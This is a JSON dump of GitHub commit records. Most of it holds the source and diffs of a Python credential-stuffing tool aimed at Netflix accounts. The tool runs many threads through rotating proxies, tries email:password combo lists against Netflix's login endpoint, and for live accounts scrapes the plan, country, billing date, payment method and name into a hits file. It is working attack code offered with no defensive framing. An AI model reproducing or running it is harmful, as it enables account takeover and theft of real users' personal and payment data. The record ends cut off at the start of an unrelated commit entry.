Trident\/7.0; rv:11.0) like Gecko\",\"Pragma\":\"no-cache\",\"Accept\":\"*\/*\"},timeout=5).cookies[\"flwssn\"]\n    def Getinfo(self) -> requests.Response : self.REQ.get(\"https:\/\/www.netflix.com\/YourAccount\",headers={\"Accept\":\"text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8,application\/signed-exchange;v=b3;q=0.9\",\"Accept-Encoding\":\"gzip, deflate, br\",\"Accept-Language\":\"en-US,en;q=0.9\",\"Connection\":\"keep-alive\",\"Host\":\"www.netflix.com\",\"Referer\":\"https:\/\/www.netflix.com\/browse\",\"Sec-Fetch-Dest\":\"document\",\"Sec-Fetch-Mode\":\"navigate\",\"Sec-Fetch-Site\":\"same-origin\",\"Sec-Fetch-User\":\"?1\",\"Upgrade-Insecure-Requests\":\"1\",\"User-Agent\":\"Mozilla\/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit\/605.1.15 (KHTML, like Gecko) Version\/13.0.3 Mobile\/15E148 Safari\/604.1\"},cookies={\"flwssn\":self.flwssn},timeout=5).text\n    def save_goodinfo(self,text) -> string:return open(f\"Hits.txt\",\"a\").write(text)\n    def save_Expaired(self,username,password) -> string:return open(f\"Expaired Accounts.txt\",\"a\").write(f\"{username}:{password}\\n\")\n\n\n    def Brute_Force(self,combo):\n        try:\n            proxies = random.choice(self.setting.proxies)\n            if self.ask == 1:\n                erp = {\"http\": f\"{proxies}\", \"https\": f\"{proxies}\"}\n            elif self.ask == 2:\n                erp = {\"http\":\"socks4:\/\/\"f\"{proxies}\", \"https\":\"socks4:\/\/\"f\"{proxies}\"}\n            elif self.ask == 3:\n                erp = {\"http\": \"socks5:\/\/\"f\"{proxies}\", \"https\":\"socks5:\/\/\"f\"{proxies}\"}\n            username,password = combo.split(\":\")\n        except:\n            pass\n        if self.askProxy == 1:\n            self.Request_login(username,password,combo,erp)\n        else:\n            self.Request_login(username,password,combo,None)\n        \n    def remove_user(self,combo):\n        if combo not in self.setting.Combo:\n            return \n        self.setting.Combo.remove(combo)\n        if len(self.setting.Combo) == 0:\n            print(\"\\n\".join(self.self.setting.Combo), file=open(dir_path + \"\/combo.txt\", \"w\"))\n\n\n            \n        \n\n\n\n    def Request_login(self,username,password,combo,proxies):\n\n        self.data['email'] = username\n        self.data['password'] = password\n        self.data['setCookies'] = True\n        try:\n            Response = self.REQ.post(\"https:\/\/cast-uiboot.prod.http1.netflix.com\/account\/auth\",headers={\"User-Agent\":\"Mozilla\/5.0 (Windows NT 10.0; WOW64; Trident\/7.0; rv:11.0) like Gecko\",\"Accept\":\"text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,*\/*;q=0.8\",\"Referer\":\"https:\/\/www.netflix.com\/Login\"},data=self.data,timeout=6,proxies=proxies)\n    \n            if \"NetflixId\\\":null,\\\"user\\\":{\\\"\" in Response.text or \"Incorrect email address or password\" in Response.text or \"Missing password\" in Response.text or \"NEVER_MEMBER\" in Response.text:\n                self.setting.BadInfo +=1\n                self.setting.Attempts +=1\n                self.remove_user(combo)\n            elif \"FORMER_MEMBER\" in Response.text:\n                self.setting.Expaired +=1\n                self.setting.Attempts +=1\n                self.remove_user(combo)\n                self.save_Expaired(username,password)\n            elif \"CURRENT_MEMBER\" in Response.text:\n                info = self.Getinfo()\n                plan = info.text.split('data-uia=\"plan-label\"><b>')[1].split('<\/b>')[0]\n                country = info.text.split('\",\"currentCountry\":\"')[1].split('\"')[0]\n                expire = info.text.split('data-uia=\"nextBillingDate-item\">')[1].split('<')[0]\n                payment = info.text.split('\"paymentMethod\":{\"fieldType\":\"String\",\"value\":\"')[1].split('\"')[0]\n                name = info.text.split('\"firstName\":\"')[1].split('\"')[0]\n                self.setting.Done +=1\n                self.setting.Attempts +=1\n                self.remove_user(combo)\n                self.save_goodinfo(f\"{username}:{password}:{plan}:{country}:{expire}:{payment}:{name}\\n\")\n            elif \"BLOCKED\" in Response.text:\n                self.setting.Blocked +=1\n            \n        except:\n            self.setting.ComboEntry -=1\n            self.setting.Retry +=1\n\n\n    def main(self):\n         while True:\n        \n            try:\n                self.setting.ComboEntry +=1\n                combo = self.setting.Combo[self.setting.ComboEntry]        \n            except:\n                self.setting.ComboEntry =-1\n            self.Brute_Force(combo)\n    def printer(self):\n        while True:\n            Design.clearConsle()\n            print(Design.reda,Design.Banner,Design.WHITE)\n            print(f\"\"\"\n\n    {Design.YELLOW}Checking  [{self.setting.Attempts}\/{len(self.setting.Combo)}]{Design.WHITE}   \n    {Design.GREEN}Good Acc [{self.setting.Done}]{Design.WHITE}\n    {Design.blueq}Expired Acc  [{self.setting.Expaired}]{Design.WHITE} \n    {Design.reda}Bad Info  [{self.setting.BadInfo}]{Design.WHITE}\n    {Design.reda}Bloked  [{self.setting.Blocked}]{Design.WHITE} \n    {Design.reda}Retry  [{self.setting.Retry}]{Design.WHITE} \n\n\n    \n    \n             \"\"\",end='\\r')\n            time.sleep(0.6)\n            if len(self.setting.Combo) == 0:\n                MsgBox(\"Finsh\",\"Sucess Checked All Combo\")\n                os._exit(0)\n            \n            \n            \n\n\n\nif __name__ == '__main__':\n   \n    \n    \n    Design.clearConsle()\n    print(Design.reda,Design.Banner,Design.WHITE)\n    b = BRUTE_FORCE()\n    Print(False,False,\"?\",Design.red,f\"Threads  {Design.reda}(Max = 1000 - Skip = 500): \",False)\n    try:\n        th = int(input())\n    except:\n        th = 500\n    threading.Thread(target=b.printer).start()\n    t = THRIDING(b.main)\n    t.Generate_threads(th)\n    t.started()\n    t.joined()\n\n\n\n\n"}},"msg":"Update Brute_Force_NetFlix.py"},"64e43926ec5b187349873fefc41a660550bbe23b":{"url":"https:\/\/api.github.com\/repos\/0xCARAXES\/Brute_Force_NetFlix\/commits\/64e43926ec5b187349873fefc41a660550bbe23b","html_url":"https:\/\/github.com\/0xCARAXES\/Brute_Force_NetFlix\/commit\/64e43926ec5b187349873fefc41a660550bbe23b","message":"Update Brute_Force_NetFlix.py","sha":"64e43926ec5b187349873fefc41a660550bbe23b","keyword":"brute force update","diff":"diff --git a\/Brute_Force_NetFlix.py b\/Brute_Force_NetFlix.py\nindex f3fbaf5..4ae894e 100644\n--- a\/Brute_Force_NetFlix.py\n+++ b\/Brute_Force_NetFlix.py\n@@ -77,8 +77,8 @@ def __init__(self):\n         self.data = {}\n     \n \n-    def flwssn(self) -> requests.Response : self.REQ.get(\"https:\/\/www.netflix.com\/au\/login\",headers={\"User-Agent\":\"Mozilla\/5.0 (Windows NT 10.0; WOW64; Trident\/7.0; rv:11.0) like Gecko\",\"Pragma\":\"no-cache\",\"Accept\":\"*\/*\"},timeout=5).cookies[\"flwssn\"]\n-    def Getinfo(self) -> requests.Response : self.REQ.get(\"https:\/\/www.netflix.com\/YourAccount\",headers={\"Accept\":\"text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8,application\/signed-exchange;v=b3;q=0.9\",\"Accept-Encoding\":\"gzip, deflate, br\",\"Accept-Language\":\"en-US,en;q=0.9\",\"Connection\":\"keep-alive\",\"Host\":\"www.netflix.com\",\"Referer\":\"https:\/\/www.netflix.com\/browse\",\"Sec-Fetch-Dest\":\"document\",\"Sec-Fetch-Mode\":\"navigate\",\"Sec-Fetch-Site\":\"same-origin\",\"Sec-Fetch-User\":\"?1\",\"Upgrade-Insecure-Requests\":\"1\",\"User-Agent\":\"Mozilla\/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit\/605.1.15 (KHTML, like Gecko) Version\/13.0.3 Mobile\/15E148 Safari\/604.1\"},cookies={\"flwssn\":self.flwssn()},timeout=5).text\n+    def flwssn(self) -> requests.Response : return self.REQ.get(\"https:\/\/www.netflix.com\/au\/login\",headers={\"User-Agent\":\"Mozilla\/5.0 (Windows NT 10.0; WOW64; Trident\/7.0; rv:11.0) like Gecko\",\"Pragma\":\"no-cache\",\"Accept\":\"*\/*\"},timeout=5).cookies[\"flwssn\"]\n+    def Getinfo(self) -> requests.Response : return self.REQ.get(\"https:\/\/www.netflix.com\/YourAccount\",headers={\"Accept\":\"text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8,application\/signed-exchange;v=b3;q=0.9\",\"Accept-Encoding\":\"gzip, deflate, br\",\"Accept-Language\":\"en-US,en;q=0.9\",\"Connection\":\"keep-alive\",\"Host\":\"www.netflix.com\",\"Referer\":\"https:\/\/www.netflix.com\/browse\",\"Sec-Fetch-Dest\":\"document\",\"Sec-Fetch-Mode\":\"navigate\",\"Sec-Fetch-Site\":\"same-origin\",\"Sec-Fetch-User\":\"?1\",\"Upgrade-Insecure-Requests\":\"1\",\"User-Agent\":\"Mozilla\/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit\/605.1.15 (KHTML, like Gecko) Version\/13.0.3 Mobile\/15E148 Safari\/604.1\"},cookies={\"flwssn\":self.flwssn()},timeout=5).text\n     def save_goodinfo(self,text) -> string:return open(f\"Hits.txt\",\"a\").write(text)\n     def save_Expaired(self,username,password) -> string:return open(f\"Expaired Accounts.txt\",\"a\").write(f\"{username}:{password}\\n\")\n \n@@ -145,7 +145,6 @@ def Request_login(self,username,password,combo,proxies):\n                 self.setting.Blocked +=1\n             \n         except:\n-            self.setting.ComboEntry -=1\n             self.setting.Retry +=1\n \n \n","files":{"\/Brute_Force_NetFlix.py":{"changes":[{"diff":"\n         self.data = {}\n     \n \n-    def flwssn(self) -> requests.Response : self.REQ.get(\"https:\/\/www.netflix.com\/au\/login\",headers={\"User-Agent\":\"Mozilla\/5.0 (Windows NT 10.0; WOW64; Trident\/7.0; rv:11.0) like Gecko\",\"Pragma\":\"no-cache\",\"Accept\":\"*\/*\"},timeout=5).cookies[\"flwssn\"]\n-    def Getinfo(self) -> requests.Response : self.REQ.get(\"https:\/\/www.netflix.com\/YourAccount\",headers={\"Accept\":\"text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8,application\/signed-exchange;v=b3;q=0.9\",\"Accept-Encoding\":\"gzip, deflate, br\",\"Accept-Language\":\"en-US,en;q=0.9\",\"Connection\":\"keep-alive\",\"Host\":\"www.netflix.com\",\"Referer\":\"https:\/\/www.netflix.com\/browse\",\"Sec-Fetch-Dest\":\"document\",\"Sec-Fetch-Mode\":\"navigate\",\"Sec-Fetch-Site\":\"same-origin\",\"Sec-Fetch-User\":\"?1\",\"Upgrade-Insecure-Requests\":\"1\",\"User-Agent\":\"Mozilla\/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit\/605.1.15 (KHTML, like Gecko) Version\/13.0.3 Mobile\/15E148 Safari\/604.1\"},cookies={\"flwssn\":self.flwssn()},timeout=5).text\n+    def flwssn(self) -> requests.Response : return self.REQ.get(\"https:\/\/www.netflix.com\/au\/login\",headers={\"User-Agent\":\"Mozilla\/5.0 (Windows NT 10.0; WOW64; Trident\/7.0; rv:11.0) like Gecko\",\"Pragma\":\"no-cache\",\"Accept\":\"*\/*\"},timeout=5).cookies[\"flwssn\"]\n+    def Getinfo(self) -> requests.Response : return self.REQ.get(\"https:\/\/www.netflix.com\/YourAccount\",headers={\"Accept\":\"text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8,application\/signed-exchange;v=b3;q=0.9\",\"Accept-Encoding\":\"gzip, deflate, br\",\"Accept-Language\":\"en-US,en;q=0.9\",\"Connection\":\"keep-alive\",\"Host\":\"www.netflix.com\",\"Referer\":\"https:\/\/www.netflix.com\/browse\",\"Sec-Fetch-Dest\":\"document\",\"Sec-Fetch-Mode\":\"navigate\",\"Sec-Fetch-Site\":\"same-origin\",\"Sec-Fetch-User\":\"?1\",\"Upgrade-Insecure-Requests\":\"1\",\"User-Agent\":\"Mozilla\/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit\/605.1.15 (KHTML, like Gecko) Version\/13.0.3 Mobile\/15E148 Safari\/604.1\"},cookies={\"flwssn\":self.flwssn()},timeout=5).text\n     def save_goodinfo(self,text) -> string:return open(f\"Hits.txt\",\"a\").write(text)\n     def save_Expaired(self,username,password) -> string:return open(f\"Expaired Accounts.txt\",\"a\").write(f\"{username}:{password}\\n\")\n \n","add":2,"remove":2,"filename":"\/Brute_Force_NetFlix.py","badparts":["    def flwssn(self) -> requests.Response : self.REQ.get(\"https:\/\/www.netflix.com\/au\/login\",headers={\"User-Agent\":\"Mozilla\/5.0 (Windows NT 10.0; WOW64; Trident\/7.0; rv:11.0) like Gecko\",\"Pragma\":\"no-cache\",\"Accept\":\"*\/*\"},timeout=5).cookies[\"flwssn\"]","    def Getinfo(self) -> requests.Response : self.REQ.get(\"https:\/\/www.netflix.com\/YourAccount\",headers={\"Accept\":\"text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8,application\/signed-exchange;v=b3;q=0.9\",\"Accept-Encoding\":\"gzip, deflate, br\",\"Accept-Language\":\"en-US,en;q=0.9\",\"Connection\":\"keep-alive\",\"Host\":\"www.netflix.com\",\"Referer\":\"https:\/\/www.netflix.com\/browse\",\"Sec-Fetch-Dest\":\"document\",\"Sec-Fetch-Mode\":\"navigate\",\"Sec-Fetch-Site\":\"same-origin\",\"Sec-Fetch-User\":\"?1\",\"Upgrade-Insecure-Requests\":\"1\",\"User-Agent\":\"Mozilla\/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit\/605.1.15 (KHTML, like Gecko) Version\/13.0.3 Mobile\/15E148 Safari\/604.1\"},cookies={\"flwssn\":self.flwssn()},timeout=5).text"],"goodparts":["    def flwssn(self) -> requests.Response : return self.REQ.get(\"https:\/\/www.netflix.com\/au\/login\",headers={\"User-Agent\":\"Mozilla\/5.0 (Windows NT 10.0; WOW64; Trident\/7.0; rv:11.0) like Gecko\",\"Pragma\":\"no-cache\",\"Accept\":\"*\/*\"},timeout=5).cookies[\"flwssn\"]","    def Getinfo(self) -> requests.Response : return self.REQ.get(\"https:\/\/www.netflix.com\/YourAccount\",headers={\"Accept\":\"text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8,application\/signed-exchange;v=b3;q=0.9\",\"Accept-Encoding\":\"gzip, deflate, br\",\"Accept-Language\":\"en-US,en;q=0.9\",\"Connection\":\"keep-alive\",\"Host\":\"www.netflix.com\",\"Referer\":\"https:\/\/www.netflix.com\/browse\",\"Sec-Fetch-Dest\":\"document\",\"Sec-Fetch-Mode\":\"navigate\",\"Sec-Fetch-Site\":\"same-origin\",\"Sec-Fetch-User\":\"?1\",\"Upgrade-Insecure-Requests\":\"1\",\"User-Agent\":\"Mozilla\/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit\/605.1.15 (KHTML, like Gecko) Version\/13.0.3 Mobile\/15E148 Safari\/604.1\"},cookies={\"flwssn\":self.flwssn()},timeout=5).text"]},{"diff":"\n                 self.setting.Blocked +=1\n             \n         except:\n-            self.setting.ComboEntry -=1\n             self.setting.Retry +=1\n \n \n","add":0,"remove":1,"filename":"\/Brute_Force_NetFlix.py","badparts":["            self.setting.ComboEntry -=1"],"goodparts":[]}],"source":"\nfrom Design import * import requests,threading,os,string,random class Settings: def __init__(self) -> object: self.Req=requests.session() self.uuid=uuid() self.Lock=threading.Lock() self.ComboEntry=-1 self.PRINT=False self.Attempts=0 self.BadInfo=0 self.Expaired=0 self.Done=0 self.Blocked=0 self.Retry=0 self.Combo= LoadFile(\"Combo\",\"combo.txt\") self.proxies=LoadFile(\"Proxies\",\"proxies.txt\") class THRIDING(): def __init__(self, fuc): self.TARGET=fuc self.threads_list=[] def Generate_threads(self, Attack): for i in range(Attack): threads=threading.Thread(target=self.TARGET) threads.setDaemon(True) self.threads_list.append(threads) return self.threads_list def started(self): for threads_Attack in self.threads_list: threads_Attack.start() def joined(self): for thread_join in self.threads_list: thread_join.join() class BRUTE_FORCE: def __init__(self): self.setting=Settings() self.REQ=requests.Session() Print(False,False,\"?\",Design.red,f\" 1-> Proxy -2-> WithOutProxy -(Skip -> Proxy): \",False); try: self.askProxy=int(input()) except: self.askProxy=1 if self.askProxy==1: Print(False,False,\"?\",Design.red,f\" 1-> http\/s -2-> socks4 -3-> socks5 -(Skip -> https): \",False); try: self.ask=int(input()) except: self.ask=1 self.data={} def flwssn(self) -> requests.Response: self.REQ.get(\"https:\/\/www.netflix.com\/au\/login\",headers={\"User-Agent\":\"Mozilla\/5.0(Windows NT 10.0; WOW64; Trident\/7.0; rv:11.0) like Gecko\",\"Pragma\":\"no-cache\",\"Accept\":\"*\/*\"},timeout=5).cookies[\"flwssn\"] def Getinfo(self) -> requests.Response: self.REQ.get(\"https:\/\/www.netflix.com\/YourAccount\",headers={\"Accept\":\"text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8,application\/signed-exchange;v=b3;q=0.9\",\"Accept-Encoding\":\"gzip, deflate, br\",\"Accept-Language\":\"en-US,en;q=0.9\",\"Connection\":\"keep-alive\",\"Host\":\"www.netflix.com\",\"Referer\":\"https:\/\/www.netflix.com\/browse\",\"Sec-Fetch-Dest\":\"document\",\"Sec-Fetch-Mode\":\"navigate\",\"Sec-Fetch-Site\":\"same-origin\",\"Sec-Fetch-User\":\"?1\",\"Upgrade-Insecure-Requests\":\"1\",\"User-Agent\":\"Mozilla\/5.0(iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit\/605.1.15(KHTML, like Gecko) Version\/13.0.3 Mobile\/15E148 Safari\/604.1\"},cookies={\"flwssn\":self.flwssn()},timeout=5).text def save_goodinfo(self,text) -> string:return open(f\"Hits.txt\",\"a\").write(text) def save_Expaired(self,username,password) -> string:return open(f\"Expaired Accounts.txt\",\"a\").write(f\"{username}:{password}\\n\") def Brute_Force(self,combo): try: proxies=random.choice(self.setting.proxies) if self.ask==1: erp={\"http\": f\"{proxies}\", \"https\": f\"{proxies}\"} elif self.ask==2: erp={\"http\":\"socks4:\/\/\"f\"{proxies}\", \"https\":\"socks4:\/\/\"f\"{proxies}\"} elif self.ask==3: erp={\"http\": \"socks5:\/\/\"f\"{proxies}\", \"https\":\"socks5:\/\/\"f\"{proxies}\"} username,password=combo.split(\":\") except: pass if self.askProxy==1: self.Request_login(username,password,combo,erp) else: self.Request_login(username,password,combo,None) def remove_user(self,combo): if combo not in self.setting.Combo: return self.setting.Combo.remove(combo) if len(self.setting.Combo)==0: print(\"\\n\".join(self.self.setting.Combo), file=open(dir_path +\"\/combo.txt\", \"w\")) def Request_login(self,username,password,combo,proxies): self.data['email']=username self.data['password']=password self.data['setCookies']=True try: Response=self.REQ.post(\"https:\/\/cast-uiboot.prod.http1.netflix.com\/account\/auth\",headers={\"User-Agent\":\"Mozilla\/5.0(Windows NT 10.0; WOW64; Trident\/7.0; rv:11.0) like Gecko\",\"Accept\":\"text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,*\/*;q=0.8\",\"Referer\":\"https:\/\/www.netflix.com\/Login\"},data=self.data,timeout=6,proxies=proxies) if \"NetflixId\\\":null,\\\"user\\\":{\\\"\" in Response.text or \"Incorrect email address or password\" in Response.text or \"Missing password\" in Response.text or \"NEVER_MEMBER\" in Response.text: self.setting.BadInfo +=1 self.setting.Attempts +=1 self.remove_user(combo) elif \"FORMER_MEMBER\" in Response.text: self.setting.Expaired +=1 self.setting.Attempts +=1 self.remove_user(combo) self.save_Expaired(username,password) elif \"CURRENT_MEMBER\" in Response.text: info=self.Getinfo() plan=info.text.split('data-uia=\"plan-label\"><b>')[1].split('<\/b>')[0] country=info.text.split('\",\"currentCountry\":\"')[1].split('\"')[0] expire=info.text.split('data-uia=\"nextBillingDate-item\">')[1].split('<')[0] payment=info.text.split('\"paymentMethod\":{\"fieldType\":\"String\",\"value\":\"')[1].split('\"')[0] name=info.text.split('\"firstName\":\"')[1].split('\"')[0] self.setting.Done +=1 self.setting.Attempts +=1 self.remove_user(combo) self.save_goodinfo(f\"{username}:{password}:{plan}:{country}:{expire}:{payment}:{name}\\n\") elif \"BLOCKED\" in Response.text: self.setting.Blocked +=1 except: self.setting.ComboEntry -=1 self.setting.Retry +=1 def main(self): while True: try: self.setting.ComboEntry +=1 combo=self.setting.Combo[self.setting.ComboEntry] except: self.setting.ComboEntry=-1 self.Brute_Force(combo) def printer(self): while True: Design.clearConsle() print(Design.reda,Design.Banner,Design.WHITE) print(f\"\"\" {Design.YELLOW}Checking [{self.setting.Attempts}\/{len(self.setting.Combo)}]{Design.WHITE} {Design.GREEN}Good Acc[{self.setting.Done}]{Design.WHITE} {Design.blueq}Expired Acc [{self.setting.Expaired}]{Design.WHITE} {Design.reda}Bad Info [{self.setting.BadInfo}]{Design.WHITE} {Design.reda}Bloked [{self.setting.Blocked}]{Design.WHITE} {Design.reda}Retry [{self.setting.Retry}]{Design.WHITE} \"\"\",end='\\r') time.sleep(0.6) if len(self.setting.Combo)==0: MsgBox(\"Finsh\",\"Sucess Checked All Combo\") os._exit(0) if __name__=='__main__': Design.clearConsle() print(Design.reda,Design.Banner,Design.WHITE) b=BRUTE_FORCE() Print(False,False,\"?\",Design.red,f\"Threads {Design.reda}(Max=1000 -Skip=500): \",False) try: th=int(input()) except: th=500 threading.Thread(target=b.printer).start() t=THRIDING(b.main) t.Generate_threads(th) t.started() t.joined() ","sourceWithComments":"from Design import *\nimport requests,threading,os,string,random\n\n\n\n\n\n\n\n\nclass Settings:\n    def __init__(self) -> object:\n        self.Req = requests.session()\n        self.uuid = uuid()\n        self.Lock = threading.Lock()\n\n        self.ComboEntry = -1\n\n        self.PRINT = False\n\n        self.Attempts = 0\n        self.BadInfo = 0\n        self.Expaired = 0\n        self.Done = 0\n        self.Blocked =0 \n        self.Retry = 0\n         \n\n        self.Combo =  LoadFile(\"Combo\",\"combo.txt\")\n        self.proxies = LoadFile(\"Proxies\",\"proxies.txt\")\n    \n\n\nclass THRIDING():\n    def __init__(self, fuc):\n        self.TARGET = fuc\n        self.threads_list = []\n\n    def Generate_threads(self, Attack):\n        for i in range(Attack):\n            threads = threading.Thread(target=self.TARGET)\n            threads.setDaemon(True)\n            self.threads_list.append(threads)\n        return self.threads_list\n\n    def started(self):\n        for threads_Attack in self.threads_list:\n            threads_Attack.start()\n\n    def joined(self):\n        for thread_join in self.threads_list:\n            thread_join.join()\n   \n\n\n\n\nclass BRUTE_FORCE:\n    def __init__(self):\n        self.setting = Settings()\n        self.REQ = requests.Session()\n        \n\n        Print(False,False,\"?\",Design.red,f\" 1-> Proxy - 2-> WithOutProxy  - (Skip -> Proxy) : \",False); \n        try : \n            self.askProxy = int(input()) \n        except:\n            self.askProxy = 1\n        if self.askProxy == 1:\n            Print(False,False,\"?\",Design.red,f\" 1-> http\/s - 2-> socks4 - 3-> socks5 - (Skip -> https) : \",False); \n            try : \n                self.ask = int(input()) \n            except:\n                self.ask = 1\n        \n\n        self.data = {}\n    \n\n    def flwssn(self) -> requests.Response : self.REQ.get(\"https:\/\/www.netflix.com\/au\/login\",headers={\"User-Agent\":\"Mozilla\/5.0 (Windows NT 10.0; WOW64; Trident\/7.0; rv:11.0) like Gecko\",\"Pragma\":\"no-cache\",\"Accept\":\"*\/*\"},timeout=5).cookies[\"flwssn\"]\n    def Getinfo(self) -> requests.Response : self.REQ.get(\"https:\/\/www.netflix.com\/YourAccount\",headers={\"Accept\":\"text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8,application\/signed-exchange;v=b3;q=0.9\",\"Accept-Encoding\":\"gzip, deflate, br\",\"Accept-Language\":\"en-US,en;q=0.9\",\"Connection\":\"keep-alive\",\"Host\":\"www.netflix.com\",\"Referer\":\"https:\/\/www.netflix.com\/browse\",\"Sec-Fetch-Dest\":\"document\",\"Sec-Fetch-Mode\":\"navigate\",\"Sec-Fetch-Site\":\"same-origin\",\"Sec-Fetch-User\":\"?1\",\"Upgrade-Insecure-Requests\":\"1\",\"User-Agent\":\"Mozilla\/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit\/605.1.15 (KHTML, like Gecko) Version\/13.0.3 Mobile\/15E148 Safari\/604.1\"},cookies={\"flwssn\":self.flwssn()},timeout=5).text\n    def save_goodinfo(self,text) -> string:return open(f\"Hits.txt\",\"a\").write(text)\n    def save_Expaired(self,username,password) -> string:return open(f\"Expaired Accounts.txt\",\"a\").write(f\"{username}:{password}\\n\")\n\n\n    def Brute_Force(self,combo):\n        try:\n            proxies = random.choice(self.setting.proxies)\n            if self.ask == 1:\n                erp = {\"http\": f\"{proxies}\", \"https\": f\"{proxies}\"}\n            elif self.ask == 2:\n                erp = {\"http\":\"socks4:\/\/\"f\"{proxies}\", \"https\":\"socks4:\/\/\"f\"{proxies}\"}\n            elif self.ask == 3:\n                erp = {\"http\": \"socks5:\/\/\"f\"{proxies}\", \"https\":\"socks5:\/\/\"f\"{proxies}\"}\n            username,password = combo.split(\":\")\n        except:\n            pass\n        if self.askProxy == 1:\n            self.Request_login(username,password,combo,erp)\n        else:\n            self.Request_login(username,password,combo,None)\n        \n    def remove_user(self,combo):\n        if combo not in self.setting.Combo:\n            return \n        self.setting.Combo.remove(combo)\n        if len(self.setting.Combo) == 0:\n            print(\"\\n\".join(self.self.setting.Combo), file=open(dir_path + \"\/combo.txt\", \"w\"))\n\n\n            \n        \n\n\n\n    def Request_login(self,username,password,combo,proxies):\n\n        self.data['email'] = username\n        self.data['password'] = password\n        self.data['setCookies'] = True\n        try:\n            Response = self.REQ.post(\"https:\/\/cast-uiboot.prod.http1.netflix.com\/account\/auth\",headers={\"User-Agent\":\"Mozilla\/5.0 (Windows NT 10.0; WOW64; Trident\/7.0; rv:11.0) like Gecko\",\"Accept\":\"text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,*\/*;q=0.8\",\"Referer\":\"https:\/\/www.netflix.com\/Login\"},data=self.data,timeout=6,proxies=proxies)\n    \n            if \"NetflixId\\\":null,\\\"user\\\":{\\\"\" in Response.text or \"Incorrect email address or password\" in Response.text or \"Missing password\" in Response.text or \"NEVER_MEMBER\" in Response.text:\n                self.setting.BadInfo +=1\n                self.setting.Attempts +=1\n                self.remove_user(combo)\n            elif \"FORMER_MEMBER\" in Response.text:\n                self.setting.Expaired +=1\n                self.setting.Attempts +=1\n                self.remove_user(combo)\n                self.save_Expaired(username,password)\n            elif \"CURRENT_MEMBER\" in Response.text:\n                info = self.Getinfo()\n                plan = info.text.split('data-uia=\"plan-label\"><b>')[1].split('<\/b>')[0]\n                country = info.text.split('\",\"currentCountry\":\"')[1].split('\"')[0]\n                expire = info.text.split('data-uia=\"nextBillingDate-item\">')[1].split('<')[0]\n                payment = info.text.split('\"paymentMethod\":{\"fieldType\":\"String\",\"value\":\"')[1].split('\"')[0]\n                name = info.text.split('\"firstName\":\"')[1].split('\"')[0]\n                self.setting.Done +=1\n                self.setting.Attempts +=1\n                self.remove_user(combo)\n                self.save_goodinfo(f\"{username}:{password}:{plan}:{country}:{expire}:{payment}:{name}\\n\")\n            elif \"BLOCKED\" in Response.text:\n                self.setting.Blocked +=1\n            \n        except:\n            self.setting.ComboEntry -=1\n            self.setting.Retry +=1\n\n\n    def main(self):\n         while True:\n        \n            try:\n                self.setting.ComboEntry +=1\n                combo = self.setting.Combo[self.setting.ComboEntry]        \n            except:\n                self.setting.ComboEntry =-1\n            self.Brute_Force(combo)\n    def printer(self):\n        while True:\n            Design.clearConsle()\n            print(Design.reda,Design.Banner,Design.WHITE)\n            print(f\"\"\"\n\n    {Design.YELLOW}Checking  [{self.setting.Attempts}\/{len(self.setting.Combo)}]{Design.WHITE}   \n    {Design.GREEN}Good Acc [{self.setting.Done}]{Design.WHITE}\n    {Design.blueq}Expired Acc  [{self.setting.Expaired}]{Design.WHITE} \n    {Design.reda}Bad Info  [{self.setting.BadInfo}]{Design.WHITE}\n    {Design.reda}Bloked  [{self.setting.Blocked}]{Design.WHITE} \n    {Design.reda}Retry  [{self.setting.Retry}]{Design.WHITE} \n\n\n    \n    \n             \"\"\",end='\\r')\n            time.sleep(0.6)\n            if len(self.setting.Combo) == 0:\n                MsgBox(\"Finsh\",\"Sucess Checked All Combo\")\n                os._exit(0)\n            \n            \n            \n\n\n\nif __name__ == '__main__':\n   \n    \n    \n    Design.clearConsle()\n    print(Design.reda,Design.Banner,Design.WHITE)\n    b = BRUTE_FORCE()\n    Print(False,False,\"?\",Design.red,f\"Threads  {Design.reda}(Max = 1000 - Skip = 500): \",False)\n    try:\n        th = int(input())\n    except:\n        th = 500\n    threading.Thread(target=b.printer).start()\n    t = THRIDING(b.main)\n    t.Generate_threads(th)\n    t.started()\n    t.joined()\n\n\n\n\n"}},"msg":"Update Brute_Force_NetFlix.py"}},"https:\/\/github.com\/zwang271\/2022-Iowa-State-REU-Temporal-Logic-":{"718b200f5ad9e33214411410c8ede6508eecccea":{"url":"https:\/\/api.github.com\/repos\/zwang271\/2022-Iowa-State-REU-Temporal-Logic-\/commits\/718b200f5ad9e33214411410c8ede6508eecccea","html_url":"https:\/\/github.com\/zwang271\/2022-Iowa-State-REU-Temporal-Logic-\/commit\/718b200f5ad9e33214411410c8ede6508eecccea","message":"Updating python brute-forcer","sha":"718b200f5ad9e33214411410c8ede6508eecccea","keyword":"brute force update","diff":"diff --git a\/MLTL_brute_forcer\/MLTL_wff.py b\/MLTL_brute_forcer\/MLTL_wff.py\ndeleted file mode 100644\nindex 5115ae6..0000000\n--- a\/MLTL_brute_forcer\/MLTL_wff.py\n+++ 